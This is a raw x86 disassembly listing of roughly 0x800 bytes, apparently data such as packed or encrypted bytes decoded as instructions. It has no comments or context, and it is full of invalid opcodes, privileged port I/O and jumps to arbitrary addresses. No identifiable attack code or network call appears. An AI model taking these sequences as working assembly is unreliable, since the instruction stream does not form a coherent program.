  423b75:	sbb    esp,DWORD PTR [edi]
  423b77:	mov    al,ds:0xa78dc85c
  423b7c:	cmp    eax,0xd4ecbd3d
  423b81:	pop    ebx
  423b82:	push   ebp
  423b83:	and    BYTE PTR [edi],0x82
  423b86:	adc    ebx,ebp
  423b88:	lea    ebp,[edi]
  423b8a:	sub    eax,ebp
  423b8c:	push   es
  423b8d:	leave  
  423b8e:	inc    ebx
  423b8f:	dec    edi
  423b90:	xchg   DWORD PTR gs:[edx+0x7d6861ed],esp
  423b97:	pop    ebx
  423b98:	and    di,WORD PTR [ebx-0x42a8a18e]
  423b9f:	aaa    
  423ba0:	jno    0x423ba1
  423ba2:	hlt    
  423ba3:	cmp    edi,0x689d42f0
  423ba9:	out    0xbb,al
  423bab:	push   es
  423bac:	xchg   ebp,eax
  423bad:	push   edx
  423bae:	pushf  
  423baf:	sahf   
  423bb0:	mov    edi,0xe5d7ea59
  423bb5:	dec    ecx
  423bb6:	jnp    0x423c06
  423bb8:	outs   dx,BYTE PTR ds:[esi]
  423bb9:	xor    BYTE PTR [edx-0x68e73fbd],0x7b
  423bc0:	scas   eax,DWORD PTR es:[edi]
  423bc1:	loop   0x423c08
  423bc3:	inc    ecx
  423bc4:	int3   
  423bc5:	and    ebp,DWORD PTR [esi+0xd]
  423bc8:	sub    eax,0xab57d890
  423bcd:	into   
  423bce:	inc    esp
  423bcf:	lahf   
  423bd0:	dec    ebx
  423bd1:	ds push cs
  423bd3:	popf   
  423bd4:	and    eax,0x79c6ebf7
  423bd9:	xchg   edi,eax
  423bda:	fs pushf 
  423bdc:	inc    ebp
  423bdd:	jae    0x423b8a
  423bdf:	dec    esp
  423be0:	xor    eax,0xa47ab9a7
  423be5:	and    BYTE PTR [ebp+edi*1-0xd],bh
  423be9:	inc    esi
  423bea:	cwde   
  423beb:	add    BYTE PTR [ebx],dh
  423bed:	mov    eax,0xccd8290f
  423bf2:	cs mov ecx,0xdf371226
  423bf8:	(bad)  
  423bf9:	xlat   BYTE PTR ds:[ebx]
  423bfa:	test   al,0x8a
  423bfc:	mov    ebx,0xdc4bfb2a
  423c01:	cmp    dl,BYTE PTR [esi-0x316f0ce7]
  423c07:	adc    ah,al
  423c09:	and    eax,0x4bb9d1d8
  423c0e:	lea    esp,[eax]
  423c10:	or     ebp,DWORD PTR [esi-0x6550114d]
  423c16:	dec    ebx
  423c17:	adc    BYTE PTR [esi+edi*1],0xdd
  423c1b:	cs pop esi
  423c1d:	bound  eax,QWORD PTR ds:0x12e596bf
  423c23:	in     al,0xd2
  423c25:	or     dh,cl
  423c27:	int    0x49
  423c29:	mov    esp,0xddbc7cf8
  423c2e:	xor    DWORD PTR [esi],0x7e8ddacb
  423c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c35:	scas   al,BYTE PTR es:[edi]
  423c36:	xchg   edi,eax
  423c37:	and    ah,BYTE PTR [edx]
  423c39:	leave  
  423c3a:	sbb    edi,DWORD PTR [esi+edx*4+0x222d9742]
  423c41:	ss xor eax,esi
  423c44:	mov    esi,0x9546b43c
  423c49:	fidivr DWORD PTR [eax-0x6a]
  423c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c4d:	mov    edi,0xef451977
  423c52:	stos   BYTE PTR es:[edi],al
  423c53:	ret    0x36e0
  423c56:	lods   al,BYTE PTR ds:[esi]
  423c57:	push   ss
  423c58:	mov    al,ds:0x2b4d8be8
  423c5d:	mov    al,0x6c
  423c5f:	dec    esp
  423c60:	adc    eax,0x37434d92
  423c65:	cmp    eax,0xe80584df
  423c6a:	push   esp
  423c6b:	dec    esi
  423c6c:	ret    
  423c6d:	in     eax,0xda
  423c6f:	loop   0x423c7c
  423c71:	mov    dl,0x25
  423c73:	jmp    0xa161:0x8ed1f616
  423c7a:	inc    ecx
  423c7b:	pop    esi
  423c7c:	loope  0x423cb5
  423c7e:	pop    eax
  423c7f:	rcr    BYTE PTR [edi+edx*8+0x7a],cl
  423c83:	pop    ss
  423c84:	pop    esp
  423c85:	icebp  
  423c86:	test   DWORD PTR [ebx],edx
  423c88:	xor    BYTE PTR [ebp+edi*1+0xa],dh
  423c8c:	adc    cl,bh
  423c8e:	int    0x27
  423c90:	mov    ds:0xdc5400c4,eax
  423c95:	mov    ah,BYTE PTR [ecx+0x2a]
  423c98:	adc    ebp,DWORD PTR [ebx]
  423c9a:	js     0x423cd5
  423c9c:	mov    bh,0x25
  423c9e:	pusha  
  423c9f:	xor    al,0xc6
  423ca1:	test   BYTE PTR [esi+0xf81cbfe],dl
  423ca7:	bound  edi,QWORD PTR [ebx]
  423ca9:	inc    BYTE PTR [edx+0x9]
  423cac:	cmp    DWORD PTR [ebx+ecx*1-0x52],edi
  423cb0:	or     ch,BYTE PTR fs:[esi-0x3b7fee5e]
  423cb7:	call   0x9e88:0x51175c12
  423cbe:	les    esp,FWORD PTR ds:0x56617ddd
  423cc4:	adc    cl,BYTE PTR [edi+0x2855f358]
  423cca:	mov    ds:0xa68f203d,eax
  423ccf:	into   
  423cd0:	jb     0x423c93
  423cd2:	and    al,0x40
  423cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cd5:	add    edx,DWORD PTR [ebx+0x1aa67897]
  423cdb:	pusha  
  423cdc:	dec    edi
  423cdd:	cmp    BYTE PTR [edi],ch
  423cdf:	and    DWORD PTR [edi],0xb03a0236
  423ce5:	mov    edx,0x2fdd3718
  423cea:	outs   dx,BYTE PTR ds:[esi]
  423ceb:	fild   DWORD PTR ds:0x38241830
  423cf1:	sub    DWORD PTR [ecx],ebx
  423cf3:	lea    ebx,[edi+ebx*2-0x4f644f9a]
  423cfa:	push   edi
  423cfb:	out    dx,eax
  423cfc:	push   ds
  423cfd:	ins    DWORD PTR es:[edi],dx
  423cfe:	cwde   
  423cff:	and    dl,dh
  423d01:	cld    
  423d02:	stc    
  423d03:	aas    
  423d04:	cmp    eax,DWORD PTR [eax]
  423d06:	cli    
  423d07:	leave  
  423d08:	paddb  mm7,QWORD PTR [eax]
  423d0b:	mov    esp,0x8045c371
  423d10:	fs jns 0x423d1f
  423d13:	int    0x27
  423d15:	arpl   WORD PTR [edi],sp
  423d17:	mov    bh,0xa
  423d19:	mov    bh,0x98
  423d1b:	leave  
  423d1c:	pop    ss
  423d1d:	icebp  
  423d1e:	ret    0x2dd9
  423d21:	or     cl,BYTE PTR [esi-0x3f050974]
  423d27:	pop    eax
  423d29:	push   ecx
  423d2a:	mov    al,0x15
  423d2c:	test   DWORD PTR [ecx-0x7ebbdb6e],eax
  423d32:	xlat   BYTE PTR ds:[ebx]
  423d33:	enter  0x50c1,0xa4
  423d37:	mov    edi,0xf4fa9f76
  423d3c:	scas   eax,DWORD PTR es:[edi]
  423d3d:	xchg   BYTE PTR [edi],dl
  423d3f:	std    
  423d40:	(bad)  
  423d41:	(bad)  [ebx-0x6605a338]
  423d47:	in     eax,dx
  423d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d49:	mov    eax,ds:0xc20bbcf2
  423d4e:	add    BYTE PTR [eiz*2+0x5a4ab139],0xa7
  423d56:	jmp    0x6345a54
  423d5b:	xchg   BYTE PTR [edx],ch
  423d5d:	sub    edi,DWORD PTR [edx+0x60]
  423d60:	test   al,0x74
  423d62:	fiadd  DWORD PTR [eax+0x21b6a97]
  423d68:	clc    
  423d69:	dec    edi
  423d6a:	stos   BYTE PTR es:[edi],al
  423d6b:	gs ror ebp,cl
  423d6e:	test   eax,0xb4bdafbd
  423d73:	cmp    eax,0xb9ec008b
  423d78:	push   esi
  423d79:	popa   
  423d7a:	aad    0x67
  423d7c:	shr    BYTE PTR [esp+esi*2-0x1a],cl
  423d80:	daa    
  423d81:	fwait
  423d82:	mov    WORD PTR [edi],?
  423d84:	retf   
  423d85:	in     al,0x40
  423d87:	lahf   
  423d88:	inc    ecx
  423d89:	fs add bl,dh
  423d8c:	or     DWORD PTR [ebp+0x1b],0x31
  423d90:	cs xchg ebp,eax
  423d92:	test   ah,bl
  423d94:	sbb    eax,DWORD PTR [edx+0x21158766]
  423d9a:	pop    es
  423d9b:	pop    ss
  423d9c:	aas    
  423d9d:	mov    ?,WORD PTR [ebx+0x9e36a94]
  423da3:	dec    edx
  423da4:	int3   
  423da5:	mov    BYTE PTR fs:[ebx-0x21fac3f6],dl
  423dac:	push   DWORD PTR [ebp+ebx*8+0x1b]
  423db0:	jae    0x423d87
  423db2:	cmp    eax,0x56dedd21
  423db7:	enter  0xd68f,0x26
  423dbb:	pushf  
  423dbc:	pop    ebx
  423dbd:	push   0xff39f72e
  423dc2:	scas   eax,DWORD PTR es:[edi]
  423dc3:	dec    eax
  423dc4:	mov    bh,0xc3
  423dc6:	mov    BYTE PTR [edi+0x23],bh
  423dc9:	test   al,0x7c
  423dcb:	push   ebx
  423dcc:	push   ebp
  423dcd:	adc    cl,BYTE PTR [edx]
  423dcf:	cmp    BYTE PTR [ecx-0x139b83a3],bh
  423dd5:	push   esi
  423dd6:	mov    ds:0xe05e1862,al
  423ddb:	int3   
  423ddc:	jns    0x423d95
  423dde:	push   ebp
  423ddf:	test   eax,0x84566692
  423de4:	es inc eax
  423de6:	mov    eax,ds:0xb7981d9a
  423deb:	jmp    0x4d714486
  423df0:	sbb    eax,esi
  423df2:	int3   
  423df3:	inc    ecx
  423df4:	adc    edx,ecx
  423df6:	and    al,0xf1
  423df8:	out    0x1b,al
  423dfa:	xor    ecx,ebp
  423dfc:	push   edi
  423dfd:	out    dx,eax
  423dfe:	or     dh,BYTE PTR [ebx]
  423e00:	js     0x423dd6
  423e02:	(bad)  
  423e03:	xchg   ecx,eax
  423e04:	repz jle 0x423dda
  423e07:	shr    DWORD PTR [eax+0x175ecdb2],cl
  423e0d:	std    
  423e0e:	jb     0x423dd2
  423e10:	pop    ebx
  423e11:	mov    cl,0x9c
  423e13:	push   ss
  423e14:	jmp    0x423da9
  423e16:	(bad)  
  423e17:	in     eax,dx
  423e18:	mov    cl,0x39
  423e1a:	xor    eax,0x28c23311
  423e1f:	jne    0x423e7b
  423e21:	cmp    ebp,DWORD PTR [edi+eiz*4-0x37]
  423e25:	xchg   ebp,eax
  423e26:	pop    esi
  423e27:	ret    
  423e28:	repz or esi,DWORD PTR [esi+eiz*4+0x61]
  423e2d:	lock or esp,DWORD PTR [ebx-0x4b511782]
  423e34:	jno    0x423dfe
  423e36:	ins    BYTE PTR es:[edi],dx
  423e37:	and    DWORD PTR [ebp-0x15],ecx
  423e3a:	jmp    0x45d5e682
  423e3f:	xor    DWORD PTR [ecx],ebp
  423e41:	pusha  
  423e42:	rol    BYTE PTR [edi],cl
  423e44:	repz and BYTE PTR [edx+0x4821d378],0xfd
  423e4c:	add    cl,al
  423e4e:	dec    eax
  423e4f:	ret    
  423e50:	cmc    
  423e51:	jne    0x423e18
  423e53:	leave  
  423e54:	aas    
  423e55:	arpl   bp,sp
  423e57:	xor    BYTE PTR [ebx+0x4],bl
  423e5a:	bound  edx,QWORD PTR ds:0xd4c0439d
  423e60:	pop    es
  423e61:	cmp    ah,ch
  423e63:	xor    DWORD PTR [edi+0x49],0x50
  423e67:	stos   DWORD PTR es:[edi],eax
  423e68:	je     0x423dee
  423e6a:	aas    
  423e6b:	pop    edi
  423e6c:	add    ecx,DWORD PTR [esi]
  423e6e:	sbb    edi,DWORD PTR [eax+0x1cff57d0]
  423e74:	icebp  
  423e75:	(bad)  
  423e77:	mov    ah,0x41
  423e79:	adc    al,0x34
  423e7b:	push   ds
  423e7c:	mov    ah,0x90
  423e7e:	jns    0x423e59
  423e80:	aaa    
  423e81:	adc    al,0x79
  423e83:	inc    esi
  423e84:	cli    
  423e85:	ficom  DWORD PTR [eax+0x25]
  423e88:	jle    0x423e93
  423e8a:	or     bl,bh
  423e8c:	inc    edi
  423e8d:	mov    dh,0x2b
  423e8f:	cmp    dh,dl
  423e91:	cmp    al,0x1f
  423e93:	icebp  
  423e94:	mov    dl,0xcf
  423e96:	or     eax,0xaddaf554
  423e9b:	jmp    0x423eb6
  423e9d:	dec    edi
  423e9e:	dec    esi
  423e9f:	mov    ?,WORD PTR [edx+ecx*2+0x14]
  423ea3:	lahf   
  423ea4:	inc    BYTE PTR [esp+esi*8+0x78604d8e]
  423eab:	pop    ebp
  423eac:	mov    esp,0x12bdb878
  423eb1:	stc    
  423eb2:	add    DWORD PTR [esi+ecx*4],0xffffffa6
  423eb6:	pop    edi
  423eb7:	aad    0x3
  423eb9:	aas    
  423eba:	push   ebp
  423ebb:	dec    ecx
  423ebc:	mov    ebx,0x656afa5a
  423ec1:	xchg   ebx,eax
  423ec2:	frstor [edx+ebx*8+0x78]
  423ec6:	inc    ebp
  423ec7:	jae    0x423e58
  423ec9:	aad    0x8f
  423ecb:	sar    DWORD PTR [ebp-0x31],0xab
  423ecf:	sbb    al,0x95
  423ed1:	mov    WORD PTR [ebx+ebx*8+0x23d52fe6],fs
  423ed8:	call   0x39e9e6e
  423edd:	or     al,0x1e
  423edf:	iret   
  423ee0:	mov    eax,0xff1b6ba8
  423ee5:	sub    DWORD PTR [edi+0x2a],esi
  423ee8:	popf   
  423ee9:	add    BYTE PTR [ecx],0x54
  423eec:	fdiv   st,st(7)
  423eee:	push   0xffffff93
  423ef0:	mov    cs,WORD PTR [esp+eiz*2+0x67]
  423ef4:	lds    eax,FWORD PTR [edx-0x569264c9]
  423efa:	push   0x39
  423efc:	ja     0x423ed7
  423efe:	jb     0x423ebb
  423f00:	(bad)  
  423f01:	call   0xfd2f03ff
  423f06:	sahf   
  423f07:	shl    BYTE PTR [eax-0x3b98e358],cl
  423f0d:	jne    0x423ec7
  423f0f:	out    0x3e,eax
  423f11:	xchg   ebx,eax
  423f12:	dec    esi
  423f13:	js     0x423f23
  423f15:	lea    ebx,[edx-0x48dd45d]
  423f1b:	mov    DWORD PTR [edi+0x9a5470c],ecx
  423f21:	inc    esi
  423f22:	jmp    0x423f7b
  423f24:	les    ebx,FWORD PTR gs:[esp+eax*2+0x12]
  423f29:	adc    BYTE PTR [ecx+0x68],0xb3
  423f2d:	js     0x423f69
  423f2f:	aam    0xfa
  423f31:	leave  
  423f32:	out    dx,al
  423f33:	das    
  423f34:	or     DWORD PTR [ecx+0x17],esp
  423f37:	mov    BYTE PTR [ebx+ecx*8],bl
  423f3a:	cmp    eax,0x67226bf
  423f3f:	jns    0x423ed7
  423f41:	lahf   
  423f42:	mov    al,0x3b
  423f44:	xchg   edi,eax
  423f45:	jmp    0x4bf9b057
  423f4a:	cli    
  423f4b:	stos   BYTE PTR es:[edi],al
  423f4c:	in     al,dx
  423f4d:	inc    eax
  423f4e:	call   0xb54d:0x80e7f315
  423f55:	fldcw  WORD PTR [edx+ebx*2+0x62609120]
  423f5c:	pop    esp
  423f5d:	out    0xd6,eax
  423f5f:	stos   DWORD PTR es:[edi],eax
  423f60:	shl    BYTE PTR [eax+0x3b],0x21
  423f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f65:	jno    0x423f30
  423f67:	cmp    al,0x84
  423f69:	mov    esi,0xd7bd284c
  423f6e:	jg     0x423f52
  423f70:	push   eax
  423f71:	lock int 0x59
  423f74:	dec    esp
  423f75:	dec    edi
  423f76:	xor    DWORD PTR [ebp-0x40ad5f8a],0x1e
  423f7d:	mov    esp,0xd40bc67e
  423f82:	mov    eax,0xd7ae4373
  423f87:	icebp  
  423f88:	xchg   edx,eax
  423f89:	inc    eax
  423f8a:	jae    0x423f7f
  423f8c:	xor    eax,0x3a096330
  423f91:	and    eax,0x5849d0a7
  423f96:	push   edi
  423f97:	xor    eax,0x471214d1
  423f9c:	aam    0x18
  423f9e:	sbb    eax,0xc711a55
  423fa3:	xchg   ecx,eax
  423fa4:	mov    al,ds:0x4d2f9ade
  423fa9:	mov    WORD PTR [edi-0x3425ec95],cs
  423faf:	push   ebx
  423fb0:	int    0xd8
  423fb2:	jge    0x423fa6
  423fb4:	inc    esi
  423fb5:	lods   eax,DWORD PTR ds:[esi]
  423fb6:	jae    0x423f86
  423fb8:	or     al,0x68
  423fba:	je     0x423ffd
  423fbc:	fistp  WORD PTR [ecx-0x3a]
  423fbf:	icebp  
  423fc0:	pusha  
  423fc1:	sub    BYTE PTR [ebx+edx*8],dl
  423fc4:	bound  esi,QWORD PTR [edi]
  423fc6:	or     al,0xd3
  423fc8:	cli    
  423fc9:	add    al,0xf5
  423fcb:	adc    BYTE PTR [esi+0x75],al
  423fce:	lahf   
  423fcf:	mov    ebp,0x6ef58202
  423fd4:	aad    0x5c
  423fd6:	pop    esp
  423fd7:	cmp    BYTE PTR [esi],0x39
  423fda:	push   ebx
  423fdb:	sub    al,0xfa
  423fdd:	pop    esp
  423fde:	lds    ecx,FWORD PTR [esi-0xb3af6ab]
  423fe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fe5:	call   0x7bba:0xecec3b48
  423fec:	retf   0x9cc8
  423fef:	shl    DWORD PTR [ebx-0x70],1
  423ff2:	xchg   esp,eax
  423ff3:	sub    bh,BYTE PTR [edx]
  423ff5:	sbb    BYTE PTR [esp+ebp*4-0x4c],al
  423ff9:	sbb    eax,0xf79527f7
  423ffe:	mov    bh,0x76
  424000:	cdq    
  424001:	retf   0x9948
  424004:	jnp    0x42400b
  424006:	rcl    BYTE PTR [eax],cl
  424008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424009:	pcmpgtd mm6,mm3
  42400c:	and    DWORD PTR ds:0x197df05f,0xffffffdd
  424013:	out    0x38,al
  424015:	sti    
  424016:	(bad)  
  424017:	in     al,dx
  424018:	fsub   DWORD PTR [ecx-0x73]
  42401b:	add    BYTE PTR [edi],0x38
  42401e:	in     al,dx
  42401f:	pop    eax
  424020:	pusha  
  424021:	fstp   DWORD PTR [eax-0x5a]
  424024:	pop    edx
  424025:	xchg   edi,eax
  424026:	dec    edi
  424027:	or     DWORD PTR [ebp+0xe],0x5b
  42402b:	in     al,0x60
  42402d:	pop    ebx
  42402e:	sti    
  42402f:	inc    ebx
  424030:	add    edx,DWORD PTR [ecx-0x6a14b091]
  424036:	adc    esi,DWORD PTR [edx-0x9]
  424039:	aam    0xef
  42403b:	adc    DWORD PTR [edx],eax
  42403d:	mov    ss,WORD PTR [edi+0x297482ab]
  424043:	cdq    
  424044:	shl    BYTE PTR [edx-0x4d],cl
  424047:	push   0x78
  424049:	cwde   
  42404a:	push   ecx
  42404b:	cld    
  42404c:	add    dh,BYTE PTR [eax]
  42404e:	mov    dh,0x2
  424050:	cli    
  424051:	mov    al,ds:0xceb3a9a
  424056:	out    0x65,al
  424058:	dec    edx
  424059:	loopne 0x42409f
  42405b:	mov    edx,0x8a391ea6
  424060:	xchg   edi,eax
  424061:	lea    ebp,[edx+0x56]
  424064:	push   ebx
  424065:	inc    esi
  424066:	fist   WORD PTR [esi]
  424068:	or     dl,al
  42406a:	xor    dh,BYTE PTR [edi]
  42406c:	push   ebx
  42406d:	fdecstp 
  42406f:	pusha  
  424070:	test   al,0x16
  424072:	cmp    esp,edx
  424074:	adc    DWORD PTR [edi],edx
  424076:	xor    esi,eax
  424078:	cmp    edx,edi
  42407a:	xor    DWORD PTR [eax+0x24],0xffffffc3
  42407e:	adc    bl,al
  424080:	xchg   BYTE PTR [esi+esi*1],al
  424083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424084:	ins    BYTE PTR es:[edi],dx
  424085:	into   
  424086:	jl     0x424055
  424088:	mov    cl,0x19
  42408a:	(bad)  
  42408b:	popf   
  42408c:	std    
  42408d:	cmp    BYTE PTR [ecx],al
  42408f:	mov    cl,0xc
  424091:	out    dx,eax
  424092:	daa    
  424093:	push   esi
  424094:	push   es
  424095:	push   esp
  424096:	sub    eax,DWORD PTR [ebx]
  424098:	popf   
  424099:	push   ebp
  42409a:	imul   edi,DWORD PTR [ebp-0x234807af],0x45be2599
  4240a4:	dec    esi
  4240a5:	clc    
  4240a6:	add    bh,bh
  4240a8:	test   bh,al
  4240aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240ab:	ja     0x424037
  4240ad:	mov    ebp,0x18f28fa7
  4240b2:	mov    ebx,DWORD PTR [ecx]
  4240b4:	outs   dx,BYTE PTR ds:[esi]
  4240b5:	pop    edi
  4240b6:	or     dh,ah
  4240b8:	push   edx
  4240b9:	mov    ds:0xcf917283,al
  4240be:	mov    eax,ds:0xe0a45e08
  4240c3:	ret    0x3aad
  4240c6:	sub    BYTE PTR [esi],al
  4240c8:	xchg   edi,eax
  4240c9:	adc    eax,0x7e941567
  4240ce:	xor    BYTE PTR [ebp-0x16],0x8
  4240d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240d3:	stos   BYTE PTR es:[edi],al
  4240d4:	and    BYTE PTR [esi],bl
  4240d6:	ja     0x42414a
  4240d8:	mov    ds:0xf7edadcf,al
  4240dd:	fwait
  4240de:	iret   
  4240df:	mov    dl,0x1
  4240e1:	dec    ecx
  4240e2:	(bad)  
  4240e4:	jge    0x4240e1
  4240e6:	xchg   edi,eax
  4240e7:	daa    
  4240e8:	aas    
  4240e9:	mov    ds:0x458c178,al
  4240ee:	clc    
  4240ef:	cmp    dh,BYTE PTR [eax-0x44]
  4240f2:	stc    
  4240f3:	xchg   DWORD PTR es:[ebx],ebp
  4240f6:	nop
  4240f7:	rcr    BYTE PTR [ebp-0x11],0xc0
  4240fb:	(bad)
  4240fe:	les    eax,FWORD PTR [eax]
	...
  424140:	add    BYTE PTR [eax],al
  424142:	mov    esp,0xf767f68f
  424147:	jg     0x424106
  424149:	fist   WORD PTR [esi+0x1dba792d]
  42414f:	lods   al,BYTE PTR ds:[esi]
  424150:	add    ah,BYTE PTR [ebp+0x1292c]
  424156:	and    eax,0x10000007
  42415b:	(bad)  
  42415c:	jns    0x424141
  42415e:	xor    edx,esi
  424160:	sub    BYTE PTR [eax-0x7cf555b1],cl
  424166:	(bad)  
  424167:	in     eax,0xc0
  424169:	(bad)  
  42416a:	pop    ds
  42416b:	jns    0x424177
  42416d:	scas   eax,DWORD PTR es:[edi]
  42416e:	mov    dl,0xa6
  424170:	xor    eax,esi
  424172:	xchg   edx,eax
  424173:	dec    edx
  424174:	mov    ds:0x33fcddb7,eax
  424179:	inc    eax
  42417a:	nop
  42417b:	jge    0x42414b
  42417d:	inc    eax
  42417e:	aas    
  42417f:	cli    
  424180:	retf   
  424181:	push   0xffffffd9
  424183:	fdiv   QWORD PTR [edx-0x72]
  424186:	pop    eax
  424187:	mov    ss,WORD PTR [ebx+0x62153f50]
  42418d:	popf   
  42418e:	dec    eax
  42418f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424190:	loopne 0x424186
  424192:	jo     0x4241d3
  424194:	pop    ss
  424195:	aaa    
  424196:	lods   al,BYTE PTR ds:[esi]
  424197:	test   BYTE PTR [ebx-0x1d1226e6],0x7a
  42419e:	sbb    DWORD PTR [edx],esp
  4241a0:	or     dh,BYTE PTR [edx-0x645b8547]
  4241a6:	in     eax,dx
  4241a7:	jp     0x424187
  4241a9:	jae    0x424201
  4241ab:	cmp    al,0x21
  4241ad:	xchg   ebx,eax
  4241ae:	adc    esi,0x3c33274c
  4241b4:	enter  0xe6b2,0x7c
  4241b8:	cmp    esp,DWORD PTR [edi]
  4241ba:	lods   eax,DWORD PTR ds:[esi]
  4241bb:	inc    esp
  4241bc:	and    eax,0x1a19bcbc
  4241c1:	sub    BYTE PTR [ecx-0x5acaae98],dl
  4241c7:	popa   
  4241c8:	loope  0x4241f3
  4241ca:	aas    
  4241cb:	lds    edx,FWORD PTR [ebp-0x51709c93]
  4241d1:	and    al,0x5a
  4241d3:	ins    BYTE PTR es:[edi],dx
  4241d4:	push   ecx
  4241d5:	push   cs
  4241d6:	mov    bl,0xc0
  4241d8:	pop    ss
  4241d9:	pop    esp
  4241da:	mov    al,ds:0xdceec3de
  4241df:	cli    
  4241e0:	dec    edi
  4241e1:	call   0x57c8:0x7b12013d
  4241e8:	mov    ecx,0x3c3a4c5e
  4241ed:	fs jg  0x424178
  4241f0:	sub    DWORD PTR [ebx-0x522c0905],0x6
  4241f7:	xor    eax,0x1a1a0d85
  4241fc:	mov    ah,0x1f
  4241fe:	pop    ecx
  4241ff:	add    eax,0x3adacd96
  424204:	push   ecx
  424205:	mov    BYTE PTR [ebx-0x2094b941],bh
  42420b:	in     eax,0x9c
  42420d:	mov    eax,0xfaf1f32
  424212:	and    edi,esi
  424214:	add    eax,0x3fd231e6
  424219:	clc    
  42421a:	adc    DWORD PTR fs:[eax-0x8],0x11
  42421f:	mov    ah,0xb
  424221:	aam    0x91
  424223:	scas   al,BYTE PTR es:[edi]
  424224:	xchg   ecx,eax
  424225:	add    eax,DWORD PTR [bx+si-0x6a7b]
  42422a:	xor    eax,0xee931f57
  42422f:	mov    edx,0x6343bfce
  424234:	cmp    al,0xf3
  424236:	mov    cl,BYTE PTR [esi-0x77881e3]
  42423c:	mov    bl,0xf5
  42423e:	mov    bh,0x24
  424240:	cld    
  424241:	xchg   ecx,eax
  424242:	add    edi,edi
  424244:	jbe    0x4241f2
  424246:	fnsave [ebp+0x4cd953e6]
  42424c:	inc    esp
  42424d:	sub    DWORD PTR [eax],ebp
  42424f:	push   esp
  424250:	clc    
  424251:	out    0x72,al
  424253:	(bad)  
  424254:	mov    cl,BYTE PTR [ebx]
  424256:	in     eax,dx
  424257:	lods   al,BYTE PTR ds:[esi]
  424258:	scas   al,BYTE PTR es:[edi]
  424259:	sar    BYTE PTR [edi],cl
  42425b:	jle    0x4241e5
  42425d:	mov    es,WORD PTR [ecx+0x23]
  424260:	daa    
  424261:	sbb    dl,BYTE PTR [eax-0x73]
  424264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424265:	daa    
  424266:	sub    al,0x6b
  424268:	sbb    eax,0x3d7ca089
  42426d:	push   edi
  42426e:	shl    BYTE PTR [esi+0x2f],0x10
  424272:	or     DWORD PTR [ebp+0x14],ebp
  424275:	adc    BYTE PTR [ecx],ch
  424277:	mov    bl,0x8b
  424279:	xchg   ecx,eax
  42427a:	out    0xb6,al
  42427c:	dec    ebp
  42427d:	sub    ah,ch
  42427f:	lods   eax,DWORD PTR ds:[esi]
  424280:	mov    cl,0x31
  424282:	mov    esp,0xbc54736
  424287:	xchg   ecx,eax
  424288:	push   edx
  424289:	(bad)  
  42428b:	nop
  42428c:	xchg   edi,eax
  42428d:	jmp    0x6207:0xb7e7aac6
  424294:	gs ret 
  424296:	jo     0x4242cb
  424298:	(bad)
  42429c:	fisttp WORD PTR [edx+0x6b]
  42429f:	jge    0x4242b2
  4242a1:	xchg   ecx,eax
  4242a2:	ror    ch,0xb5
  4242a5:	stos   DWORD PTR es:[edi],eax
  4242a6:	je     0x424280
  4242a8:	aad    0xae
  4242aa:	xchg   ecx,eax
  4242ab:	sbb    eax,DWORD PTR [eax+0x46221ef8]
  4242b1:	jns    0x4242ee
  4242b3:	pop    esi
  4242b4:	std    
  4242b5:	(bad)  
  4242b6:	sub    edi,edi
  4242b8:	shr    BYTE PTR [edi+esi*8+0x4d],0x63
  4242bd:	popa   
  4242be:	inc    ebx
  4242bf:	shl    BYTE PTR [edi+0x652a49c8],1
  4242c5:	sahf   
  4242c6:	or     eax,0xbaa442c0
  4242cb:	aaa    
  4242cc:	cmp    ah,dh
  4242ce:	rol    DWORD PTR [edi+0x256f164],cl
  4242d4:	inc    esp
  4242d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242d6:	test   DWORD PTR [edx+ebp*4+0xfffbf02],ebx
  4242dd:	repz loop 0x424324
  4242e0:	dec    edx
  4242e1:	shr    ah,0x42
  4242e4:	lods   al,BYTE PTR ds:[esi]
  4242e5:	jp     0x424357
  4242e7:	sub    DWORD PTR [eax+ebx*8],eax
  4242ea:	adc    bh,BYTE PTR [ecx+eiz*1]
  4242ed:	lods   eax,DWORD PTR ds:[esi]
  4242ee:	ret    0x812b
  4242f1:	aam    0x77
  4242f3:	mov    dh,BYTE PTR [ebp-0x5f]
  4242f6:	xchg   edi,eax
  4242f7:	add    ebp,DWORD PTR [eax-0xe14970a]
  4242fd:	cmp    al,bl
  4242ff:	(bad)
  424303:	in     eax,dx
  424304:	call   esp
  424306:	ds sbb al,bh
  424309:	js     0x4242e6
  42430b:	shl    DWORD PTR [edx+0x3c],0x22
  42430f:	mov    bl,0xac
  424311:	ins    BYTE PTR es:[edi],dx
  424312:	fsub   st,st(4)
  424314:	xchg   ecx,eax
  424315:	scas   eax,DWORD PTR es:[edi]
  424316:	push   cs
  424317:	(bad)  
  424318:	pop    ecx
  424319:	push   0xd2fcd4dd
  42431e:	add    al,0xab
  424320:	jp     0x424336
  424322:	dec    ebx
  424323:	fwait
  424324:	pop    eax
  424325:	callw  0x970
  424329:	in     al,dx
  42432a:	sahf   
  42432b:	(bad)  
  42432c:	int    0x2e
  42432e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42432f:	xchg   edx,eax
  424330:	repnz mov ebp,0x205c036f
  424336:	in     eax,0xeb
  424338:	jp     0x4242d4
  42433a:	out    dx,al
  42433b:	xor    esp,DWORD PTR [ebp-0x14]
  42433e:	enter  0xcb05,0x71
  424342:	fnstenv [edx]
  424344:	shl    edx,1
  424346:	shl    DWORD PTR [edx+edi*4],1
  424349:	xchg   BYTE PTR [esi+eiz*2+0xb9bb551],al
  424350:	sti    
  424351:	mov    al,ds:0x7c5202ae
  424356:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  424358:	push   ebp
  424359:	cdq    
  42435a:	fist   WORD PTR [edx+0x5dd65d8d]
  424360:	mov    ebp,0x2bd676d1
